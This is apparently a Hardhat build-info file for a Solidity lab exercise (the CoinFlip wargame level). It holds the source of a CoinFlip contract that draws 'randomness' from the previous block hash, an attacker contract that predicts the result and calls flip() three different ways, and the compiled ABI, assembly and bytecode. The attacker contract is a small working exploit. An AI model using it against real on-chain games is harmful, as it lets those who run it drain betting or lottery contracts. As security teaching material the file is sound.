{
	"id": "e7641106415b9118fbc5ed0efa6d75af",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.6.12",
	"solcLongVersion": "0.6.12+commit.27d51765",
	"input": {
		"language": "Solidity",
		"sources": {
			"contract/security/CoinFlipAttacker.sol": {
				"content": "pragma solidity ^0.6.0;\r\n\r\n// 由于使用在线版本remix，所以需要\r\nimport \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\";\r\n\r\n// 用于使用被调用合约实例（已知被调用合约代码）\r\ncontract CoinFlip {\r\n  using SafeMath for uint256;\r\n  uint256 public consecutiveWins;\r\n  uint256 lastHash;\r\n  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\r\n\r\n  constructor() public {\r\n    consecutiveWins = 0;\r\n  }\r\n\r\n  function flip(bool _guess) public returns (bool) {\r\n    uint256 blockValue = uint256(blockhash(block.number.sub(1)));\r\n\r\n    if (lastHash == blockValue) {\r\n      revert();\r\n    }\r\n\r\n    lastHash = blockValue;\r\n    uint256 coinFlip = blockValue.div(FACTOR);\r\n    bool side = coinFlip == 1 ? true : false;\r\n\r\n    if (side == _guess) {\r\n      consecutiveWins++;\r\n      return true;\r\n    } else {\r\n      consecutiveWins = 0;\r\n      return false;\r\n    }\r\n  }\r\n}\r\n\r\n// 用于 使用被调用合约接口实例（仅知道被调用合约接口）\r\ninterface CoinFlipInterface {\r\n    function flip(bool _guess) external returns (bool);\r\n}\r\n\r\ncontract CoinFlipAttacker{\r\n    \r\n    using SafeMath for uint256;\r\n    address private addr;\r\n    CoinFlip cf_ins;\r\n    CoinFlipInterface cf_interface;\r\n\r\n    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\r\n\r\n    constructor(address _addr) public {\r\n        addr = _addr;\r\n        cf_ins = CoinFlip(_addr);\r\n        cf_interface = CoinFlipInterface(_addr);\r\n    }\r\n\r\n    // 当用户发出请求时，合约在内部先自己做一次运算，得到结果，发起合约内部调用\r\n    function getFlip() private returns (bool) {\r\n        uint256 blockValue = uint256(blockhash(block.number.sub(1)));\r\n        uint256 coinFlip = blockValue.div(FACTOR);\r\n        bool side = coinFlip == 1 ? true : false;\r\n        return side;\r\n    }\r\n\r\n    // 使用被调用合约实例（已知被调用合约代码）\r\n    function attackByIns() public {\r\n        bool side = getFlip();\r\n        cf_ins.flip(side);\r\n    }\r\n\r\n    // 使用被调用合约接口实例（仅知道被调用合约接口）\r\n    function attackByInterface() public {\r\n        bool side = getFlip();\r\n        cf_interface.flip(side);\r\n    }\r\n\r\n    // 使用call命令调用合约\r\n    function attackByCall() public {\r\n        bool side = getFlip();\r\n        addr.call(abi.encodeWithSignature(\"flip(bool)\",side));\r\n    }\r\n\r\n}\r\n"
			},
			"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol": {
				"content": "pragma solidity ^0.6.0;\n\n/**\n * @dev Wrappers over Solidity's arithmetic operations with added overflow\n * checks.\n *\n * Arithmetic operations in Solidity wrap on overflow. This can easily result\n * in bugs, because programmers usually assume that an overflow raises an\n * error, which is the standard behavior in high level programming languages.\n * `SafeMath` restores this intuition by reverting the transaction when an\n * operation overflows.\n *\n * Using this library instead of the unchecked operations eliminates an entire\n * class of bugs, so it's recommended to use it always.\n */\nlibrary SafeMath {\n    /**\n     * @dev Returns the addition of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `+` operator.\n     *\n     * Requirements:\n     * - Addition cannot overflow.\n     */\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     * - Subtraction cannot overflow.\n     */\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     * - Subtraction cannot overflow.\n     */\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    /**\n     * @dev Returns the multiplication of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `*` operator.\n     *\n     * Requirements:\n     * - Multiplication cannot overflow.\n     */\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n        // benefit is lost if 'b' is also tested.\n        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    /**\n     * @dev Returns the integer division of two unsigned integers. Reverts on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     * - The divisor cannot be zero.\n     */\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    /**\n     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     * - The divisor cannot be zero.\n     */\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        // Solidity only automatically asserts when dividing by 0\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n\n        return c;\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * Reverts when dividing by zero.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     * - The divisor cannot be zero.\n     */\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * Reverts with custom message when dividing by zero.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     * - The divisor cannot be zero.\n     */\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		}
	},
	"output": {
		"contracts": {
			"contract/security/CoinFlipAttacker.sol": {
				"CoinFlip": {
					"abi": [
						{
							"inputs": [],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"inputs": [],
							"name": "consecutiveWins",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "bool",
									"name": "_guess",
									"type": "bool"
								}
							],
							"name": "flip",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"contract/security/CoinFlipAttacker.sol\":255:981  contract CoinFlip {\r... */\n  mstore(0x40, 0x80)\n    /* \"contract/security/CoinFlipAttacker.sol\":382:459  57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x8000000000000000000000000000000000000000000000000000000000000000\n    /* \"contract/security/CoinFlipAttacker.sol\":365:459  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x02\n  sstore\n    /* \"contract/security/CoinFlipAttacker.sol\":466:519  constructor() public {\r... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n    /* \"contract/security/CoinFlipAttacker.sol\":512:513  0 */\n  0x00\n    /* \"contract/security/CoinFlipAttacker.sol\":494:509  consecutiveWins */\n  dup1\n    /* \"contract/security/CoinFlipAttacker.sol\":494:513  consecutiveWins = 0 */\n  dup2\n  swap1\n  sstore\n  pop\n    /* \"contract/security/CoinFlipAttacker.sol\":255:981  contract CoinFlip {\r... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contract/security/CoinFlipAttacker.sol\":255:981  contract CoinFlip {\r... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x1d263f67\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xe6f334d7\n      eq\n      tag_4\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contract/security/CoinFlipAttacker.sol\":525:978  function flip(bool _guess) public returns (bool) {\r... */\n    tag_3:\n      tag_5\n      0x04\n      dup1\n      calldatasize\n      sub\n      0x20\n      dup2\n      lt\n      iszero\n      tag_6\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_6:\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      iszero\n      iszero\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_7\n      jump\t// in\n    tag_5:\n      mload(0x40)\n      dup1\n      dup3\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contract/security/CoinFlipAttacker.sol\":309:339  uint256 public consecutiveWins */\n    tag_4:\n      tag_8\n      tag_9\n      jump\t// in\n    tag_8:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contract/security/CoinFlipAttacker.sol\":525:978  function flip(bool _guess) public returns (bool) {\r... */\n    tag_7:\n        /* \"contract/security/CoinFlipAttacker.sol\":568:572  bool */\n      0x00\n        /* \"contract/security/CoinFlipAttacker.sol\":581:599  uint256 blockValue */\n      dup1\n        /* \"contract/security/CoinFlipAttacker.sol\":620:639  block.number.sub(1) */\n      tag_11\n        /* \"contract/security/CoinFlipAttacker.sol\":637:638  1 */\n      0x01\n        /* \"contract/security/CoinFlipAttacker.sol\":620:632  block.number */\n      number\n        /* \"contract/security/CoinFlipAttacker.sol\":620:636  block.number.sub */\n      tag_12\n      swap1\n        /* \"contract/security/CoinFlipAttacker.sol\":620:639  block.number.sub(1) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_11:\n        /* \"contract/security/CoinFlipAttacker.sol\":610:640  blockhash(block.number.sub(1)) */\n      blockhash\n        /* \"contract/security/CoinFlipAttacker.sol\":602:641  uint256(blockhash(block.number.sub(1))) */\n      0x00\n      shr\n        /* \"contract/security/CoinFlipAttacker.sol\":581:641  uint256 blockValue = uint256(blockhash(block.number.sub(1))) */\n      swap1\n      pop\n        /* \"contract/security/CoinFlipAttacker.sol\":666:676  blockValue */\n      dup1\n        /* \"contract/security/CoinFlipAttacker.sol\":654:662  lastHash */\n      sload(0x01)\n        /* \"contract/security/CoinFlipAttacker.sol\":654:676  lastHash == blockValue */\n      eq\n        /* \"contract/security/CoinFlipAttacker.sol\":650:703  if (lastHash == blockValue) {\r... */\n      iszero\n      tag_13\n      jumpi\n        /* \"contract/security/CoinFlipAttacker.sol\":687:695  revert() */\n      0x00\n      dup1\n      revert\n        /* \"contract/security/CoinFlipAttacker.sol\":650:703  if (lastHash == blockValue) {\r... */\n    tag_13:\n        /* \"contract/security/CoinFlipAttacker.sol\":722:732  blockValue */\n      dup1\n        /* \"contract/security/CoinFlipAttacker.sol\":711:719  lastHash */\n      0x01\n        /* \"contract/security/CoinFlipAttacker.sol\":711:732  lastHash = blockValue */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contract/security/CoinFlipAttacker.sol\":739:755  uint256 coinFlip */\n      0x00\n        /* \"contract/security/CoinFlipAttacker.sol\":758:780  blockValue.div(FACTOR) */\n      tag_14\n        /* \"contract/security/CoinFlipAttacker.sol\":773:779  FACTOR */\n      sload(0x02)\n        /* \"contract/security/CoinFlipAttacker.sol\":758:768  blockValue */\n      dup4\n        /* \"contract/security/CoinFlipAttacker.sol\":758:772  blockValue.div */\n      tag_15\n      swap1\n        /* \"contract/security/CoinFlipAttacker.sol\":758:780  blockValue.div(FACTOR) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_14:\n        /* \"contract/security/CoinFlipAttacker.sol\":739:780  uint256 coinFlip = blockValue.div(FACTOR) */\n      swap1\n      pop\n        /* \"contract/security/CoinFlipAttacker.sol\":787:796  bool side */\n      0x00\n        /* \"contract/security/CoinFlipAttacker.sol\":811:812  1 */\n      0x01\n        /* \"contract/security/CoinFlipAttacker.sol\":799:807  coinFlip */\n      dup3\n        /* \"contract/security/CoinFlipAttacker.sol\":799:812  coinFlip == 1 */\n      eq\n        /* \"contract/security/CoinFlipAttacker.sol\":799:827  coinFlip == 1 ? true : false */\n      tag_16\n      jumpi\n        /* \"contract/security/CoinFlipAttacker.sol\":822:827  false */\n      0x00\n        /* \"contract/security/CoinFlipAttacker.sol\":799:827  coinFlip == 1 ? true : false */\n      jump(tag_17)\n    tag_16:\n        /* \"contract/security/CoinFlipAttacker.sol\":815:819  true */\n      0x01\n        /* \"contract/security/CoinFlipAttacker.sol\":799:827  coinFlip == 1 ? true : false */\n    tag_17:\n        /* \"contract/security/CoinFlipAttacker.sol\":787:827  bool side = coinFlip == 1 ? true : false */\n      swap1\n      pop\n        /* \"contract/security/CoinFlipAttacker.sol\":848:854  _guess */\n      dup5\n        /* \"contract/security/CoinFlipAttacker.sol\":840:854  side == _guess */\n      iszero\n      iszero\n        /* \"contract/security/CoinFlipAttacker.sol\":840:844  side */\n      dup2\n        /* \"contract/security/CoinFlipAttacker.sol\":840:854  side == _guess */\n      iszero\n      iszero\n      eq\n        /* \"contract/security/CoinFlipAttacker.sol\":836:973  if (side == _guess) {\r... */\n      iszero\n      tag_18\n      jumpi\n        /* \"contract/security/CoinFlipAttacker.sol\":865:880  consecutiveWins */\n      0x00\n      dup1\n        /* \"contract/security/CoinFlipAttacker.sol\":865:882  consecutiveWins++ */\n      dup2\n      sload\n      dup1\n      swap3\n      swap2\n      swap1\n      0x01\n      add\n      swap2\n      swap1\n      pop\n      sstore\n      pop\n        /* \"contract/security/CoinFlipAttacker.sol\":898:902  true */\n      0x01\n        /* \"contract/security/CoinFlipAttacker.sol\":891:902  return true */\n      swap4\n      pop\n      pop\n      pop\n      pop\n      jump(tag_10)\n        /* \"contract/security/CoinFlipAttacker.sol\":836:973  if (side == _guess) {\r... */\n    tag_18:\n        /* \"contract/security/CoinFlipAttacker.sol\":943:944  0 */\n      0x00\n        /* \"contract/security/CoinFlipAttacker.sol\":925:940  consecutiveWins */\n      dup1\n        /* \"contract/security/CoinFlipAttacker.sol\":925:944  consecutiveWins = 0 */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contract/security/CoinFlipAttacker.sol\":960:965  false */\n      0x00\n        /* \"contract/security/CoinFlipAttacker.sol\":953:965  return false */\n      swap4\n      pop\n      pop\n      pop\n      pop\n        /* \"contract/security/CoinFlipAttacker.sol\":525:978  function flip(bool _guess) public returns (bool) {\r... */\n    tag_10:\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"contract/security/CoinFlipAttacker.sol\":309:339  uint256 public consecutiveWins */\n    tag_9:\n      sload(0x00)\n      dup2\n      jump\t// out\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1274:1408  function sub(uint256 a, uint256 b) internal pure returns (uint256) {... */\n    tag_12:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1332:1339  uint256 */\n      0x00\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1358:1401  sub(a, b, \"SafeMath: subtraction overflow\") */\n      tag_21\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1362:1363  a */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1365:1366  b */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1358:1401  sub(a, b, \"SafeMath: subtraction overflow\") */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x1e\n      dup2\n      mstore\n      0x20\n      add\n      0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000\n      dup2\n      mstore\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1358:1361  sub */\n      tag_22\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1358:1401  sub(a, b, \"SafeMath: subtraction overflow\") */\n      jump\t// in\n    tag_21:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1351:1401  return sub(a, b, \"SafeMath: subtraction overflow\") */\n      swap1\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1274:1408  function sub(uint256 a, uint256 b) internal pure returns (uint256) {... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3033:3163  function div(uint256 a, uint256 b) internal pure returns (uint256) {... */\n    tag_15:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3091:3098  uint256 */\n      0x00\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3117:3156  div(a, b, \"SafeMath: division by zero\") */\n      tag_24\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3121:3122  a */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3124:3125  b */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3117:3156  div(a, b, \"SafeMath: division by zero\") */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x1a\n      dup2\n      mstore\n      0x20\n      add\n      0x536166654d6174683a206469766973696f6e206279207a65726f000000000000\n      dup2\n      mstore\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3117:3120  div */\n      tag_25\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3117:3156  div(a, b, \"SafeMath: division by zero\") */\n      jump\t// in\n    tag_24:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3110:3156  return div(a, b, \"SafeMath: division by zero\") */\n      swap1\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3033:3163  function div(uint256 a, uint256 b) internal pure returns (uint256) {... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1692:1879  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {... */\n    tag_22:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1778:1785  uint256 */\n      0x00\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1810:1811  a */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1805:1806  b */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1805:1811  b <= a */\n      gt\n      iszero\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1813:1825  errorMessage */\n      dup3\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1797:1826  require(b <= a, errorMessage) */\n      swap1\n      tag_27\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup4\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n      0x00\n    tag_28:\n      dup4\n      dup2\n      lt\n      iszero\n      tag_30\n      jumpi\n      dup1\n      dup3\n      add\n      mload\n      dup2\n      dup5\n      add\n      mstore\n      0x20\n      dup2\n      add\n      swap1\n      pop\n      jump(tag_28)\n    tag_30:\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_31\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_31:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_27:\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1836:1845  uint256 c */\n      0x00\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1852:1853  b */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1848:1849  a */\n      dup6\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1848:1853  a - b */\n      sub\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1836:1853  uint256 c = a - b */\n      swap1\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1871:1872  c */\n      dup1\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1864:1872  return c */\n      swap2\n      pop\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1692:1879  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {... */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3638:3976  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {... */\n    tag_25:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3724:3731  uint256 */\n      0x00\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3821:3822  0 */\n      dup1\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3817:3818  b */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3817:3822  b > 0 */\n      gt\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3824:3836  errorMessage */\n      dup3\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3809:3837  require(b > 0, errorMessage) */\n      swap1\n      tag_33\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup4\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n      0x00\n    tag_34:\n      dup4\n      dup2\n      lt\n      iszero\n      tag_36\n      jumpi\n      dup1\n      dup3\n      add\n      mload\n      dup2\n      dup5\n      add\n      mstore\n      0x20\n      dup2\n      add\n      swap1\n      pop\n      jump(tag_34)\n    tag_36:\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_37\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_37:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_33:\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3847:3856  uint256 c */\n      0x00\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3863:3864  b */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3859:3860  a */\n      dup6\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3859:3864  a / b */\n      dup2\n      tag_38\n      jumpi\n      invalid\n    tag_38:\n      div\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3847:3864  uint256 c = a / b */\n      swap1\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3968:3969  c */\n      dup1\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3961:3969  return c */\n      swap2\n      pop\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3638:3976  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {... */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220d74fc45c4573c64c77ffcc7c1d298b625b36505fa39c1c1448ef7b4c37bdfa6a64736f6c634300060c0033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "60806040527f800000000000000000000000000000000000000000000000000000000000000060025534801561003457600080fd5b50600080819055506103948061004b6000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80631d263f671461003b578063e6f334d714610081575b600080fd5b6100696004803603602081101561005157600080fd5b8101908080351515906020019092919050505061009f565b60405180821515815260200191505060405180910390f35b61008961013e565b6040518082815260200191505060405180910390f35b6000806100b660014361014490919063ffffffff16565b4060001c90508060015414156100cb57600080fd5b8060018190555060006100e96002548361018e90919063ffffffff16565b90506000600182146100fc5760006100ff565b60015b9050841515811515141561012a57600080815480929190600101919050555060019350505050610139565b60008081905550600093505050505b919050565b60005481565b600061018683836040518060400160405280601e81526020017f536166654d6174683a207375627472616374696f6e206f766572666c6f7700008152506101d8565b905092915050565b60006101d083836040518060400160405280601a81526020017f536166654d6174683a206469766973696f6e206279207a65726f0000000000008